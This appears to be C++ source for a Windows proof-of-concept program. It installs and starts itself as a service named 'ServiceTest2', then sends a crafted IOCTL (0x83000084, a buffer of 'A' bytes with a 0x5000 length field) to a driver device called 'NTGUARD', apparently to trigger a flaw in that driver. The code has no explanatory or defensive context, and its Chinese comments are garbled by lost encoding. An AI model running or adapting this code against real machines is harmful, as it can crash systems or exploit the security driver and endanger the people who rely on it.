// test_servers.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "test_servers.h"

#include <tchar.h>
#include <Windows.h>
   
//����ȫ�ֺ�������   
void Init();   
BOOL IsInstalled();   
BOOL Install();   
BOOL Uninstall();   
void LogEvent(LPCSTR pszFormat, ...);   
void WINAPI ServiceMain();   
void WINAPI ServiceStrl(DWORD dwOpcode);   
   
TCHAR szServiceName[] = _T("ServiceTest2");   
BOOL bInstall;   
SERVICE_STATUS_HANDLE hServiceStatus;   
SERVICE_STATUS status;   
DWORD dwThreadID;   
   







HANDLE OpenDevice(char *szDeviceName)
{
	char szOpenDeviceName[0x200] = {0};
	wsprintf(szOpenDeviceName, "\\\\.\\%s", szDeviceName);

	HANDLE hDevice = CreateFileA(szOpenDeviceName, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("\t = GENERIC_READ | GENERIC_WRITE\n");
		return hDevice;
	}

	hDevice = CreateFileA(szOpenDeviceName, GENERIC_READ, 0, 0, OPEN_EXISTING,0,0);

	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("\t = GENERIC_READ\n");
		return hDevice;
	}

	hDevice = CreateFileA(szOpenDeviceName, GENERIC_WRITE, 0, 0, OPEN_EXISTING,0,0);

	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("\t = GENERIC_WRITE\n");
		return hDevice;
	}


	OutputDebugStringA("\t = ��Ȩ��ERROR!\n");

	return 0;
}


void x83000084( )
{
	HANDLE m_handle = OpenDevice("NTGUARD");
	DWORD nbBytes = 0;
	char*szBuf = new char[0x10];
	memset(szBuf, 0x41, 0x10);

	*(DWORD *)szBuf = 0x5000;
	DeviceIoControl(m_handle, 0x83000084, (LPVOID)szBuf,  0x10, (LPVOID)szBuf, 0x10, &nbBytes, NULL);
	delete[] szBuf;
	return;
}



int APIENTRY WinMain(HINSTANCE hInstance,   
                     HINSTANCE hPrevInstance,   
                     LPSTR     lpCmdLine,   
                     int       nCmdShow)   
{   
    Init();   
   
    dwThreadID = ::GetCurrentThreadId();

	Install();
	system("NET START ServiceTest2");
   
    SERVICE_TABLE_ENTRY st[] =   
    {   
        { szServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain },   
        { NULL, NULL }   
    };   
   
    if (stricmp(lpCmdLine, "/install") == 0)   
    {   
        Install();   
    }   
    else if (stricmp(lpCmdLine, "/uninstall") == 0)   
    {   
        Uninstall();   
    }   
    else   
    {   
        if (!::StartServiceCtrlDispatcher(st))   
        {   
            LogEvent("Register Service Main Function Error!");   
        }   
    }   
   
    return 0;   
}   
//*********************************************************   
//Functiopn:            Init   
//Description:          ��ʼ��   
//*********************************************************   
void Init()   
{   
    hServiceStatus = NULL;   
    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;   
    status.dwCurrentState = SERVICE_STOPPED;   
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;   
    status.dwWin32ExitCode = 0;   
    status.dwServiceSpecificExitCode = 0;   
    status.dwCheckPoint = 0;   
    status.dwWaitHint = 0;   
}   
   
//*********************************************************   
//Functiopn:            ServiceMain   
//Description:          ��������������������п��ƶԷ�����Ƶ�ע��   
//*********************************************************   
void WINAPI ServiceMain()   
{   
    // Register the control request handler   
    status.dwCurrentState = SERVICE_START_PENDING;   
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;   
   
    //ע��������   
    hServiceStatus = RegisterServiceCtrlHandler(szServiceName, ServiceStrl);   
    if (hServiceStatus == NULL)   
    {   
        LogEvent("Handler not installed");   
        return;   
    }   
    SetServiceStatus(hServiceStatus, &status);   
   
    status.dwWin32ExitCode = S_OK;   
    status.dwCheckPoint = 0;   
    status.dwWaitHint = 0;   
    status.dwCurrentState = SERVICE_RUNNING;   
    SetServiceStatus(hServiceStatus, &status);   
   
	//////////////////////////////////////////////////////////////////////////
    //ģ���������У�10���Զ��˳���Ӧ��ʱ����Ҫ������ڴ˼���   
    x83000084();
    //////////////////////////////////////////////////////////////////////////
       
   
    status.dwCurrentState = SERVICE_STOPPED;   
    SetServiceStatus(hServiceStatus, &status);   
    LogEvent("Service stopped");   
}   
   
//*********************************************************   
//Functiopn:            ServiceStrl   
//Description:          �������������������ʵ�ֶԷ���Ŀ��ƣ�   
//                      ���ڷ����������ֹͣ����������ʱ���������д˴�����    
//*********************************************************   
void WINAPI ServiceStrl(DWORD dwOpcode)   
{   
    switch (dwOpcode)   
    {   
    case SERVICE_CONTROL_STOP:   
        status.dwCurrentState = SERVICE_STOP_PENDING;   
        SetServiceStatus(hServiceStatus, &status);   
        PostThreadMessage(dwThreadID, WM_CLOSE, 0, 0);   
        break;   
    case SERVICE_CONTROL_PAUSE:   
        break;   
    case SERVICE_CONTROL_CONTINUE:   
        break;   
    case SERVICE_CONTROL_INTERROGATE:   
        break;   
    case SERVICE_CONTROL_SHUTDOWN:   
        break;   
    default:   
        LogEvent("Bad service request");   
    }   
}   
//*********************************************************   
//Functiopn:            IsInstalled   
//Description:          �жϷ����Ƿ��Ѿ�����װ     
//*********************************************************   
BOOL IsInstalled()   
{   
    BOOL bResult = FALSE;   
   
    //�򿪷�����ƹ�����   
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);   
   
    if (hSCM != NULL)   
    {   
        //�򿪷���   
        SC_HANDLE hService = ::OpenService(hSCM, szServiceName, SERVICE_QUERY_CONFIG);   
        if (hService != NULL)   
        {   
            bResult = TRUE;   
            ::CloseServiceHandle(hService);   
        }   
        ::CloseServiceHandle(hSCM);   
    }   
    return bResult;   
}   
   
//*********************************************************   
//Functiopn:            Install   
//Description:          ��װ������     
//*********************************************************   
BOOL Install()   
{   
    if (IsInstalled())   
        return TRUE;   
   
    //�򿪷�����ƹ�����   
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);   
    if (hSCM == NULL)   
    {   
        MessageBox(NULL, _T("Couldn't open service manager"), szServiceName, MB_OK);   
        return FALSE;   
    }   
   
    // Get the executable file path   
    TCHAR szFilePath[MAX_PATH];   
    ::GetModuleFileName(NULL, szFilePath, MAX_PATH);   
   
    //��������   
    SC_HANDLE hService = ::CreateService(   
        hSCM, szServiceName, szServiceName,   
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,   
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,   
        szFilePath, NULL, NULL, _T(""), NULL, NULL);   
   
    if (hService == NULL)   
    {   
        ::CloseServiceHandle(hSCM);   
        MessageBox(NULL, _T("Couldn't create service"), szServiceName, MB_OK);   
        return FALSE;   
    }   
   
    ::CloseServiceHandle(hService);   
    ::CloseServiceHandle(hSCM);   
    return TRUE;   
}   
   
//*********************************************************   
//Functiopn:            Uninstall   
//Description:          ɾ��������    
//*********************************************************   
BOOL Uninstall()   
{   
    if (!IsInstalled())   
        return TRUE;   
   
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);   
   
    if (hSCM == NULL)   
    {   
        MessageBox(NULL, _T("Couldn't open service manager"), szServiceName, MB_OK);   
        return FALSE;   
    }   
   
    SC_HANDLE hService = ::OpenService(hSCM, szServiceName, SERVICE_STOP | DELETE);   
   
    if (hService == NULL)   
    {   
        ::CloseServiceHandle(hSCM);   
        MessageBox(NULL, _T("Couldn't open service"), szServiceName, MB_OK);   
        return FALSE;   
    }   
    SERVICE_STATUS status;   
    ::ControlService(hService, SERVICE_CONTROL_STOP, &status);   
   
    //ɾ������   
    BOOL bDelete = ::DeleteService(hService);   
    ::CloseServiceHandle(hService);   
    ::CloseServiceHandle(hSCM);   
   
    if (bDelete)   
        return TRUE;   
   
    LogEvent("Service could not be deleted");   
    return FALSE;   
}   
   
//*********************************************************   
//Functiopn:            LogEvent   
//Description:          ��¼�����¼�    
//*********************************************************   
void LogEvent(LPCSTR lpszFormat, ...)
{
	va_list   args;
	CHAR     szBuffer[0x4000];
	va_start(args, lpszFormat);
	wvsprintfA(szBuffer, lpszFormat, args);
	OutputDebugStringA(szBuffer);
	va_end(args);

}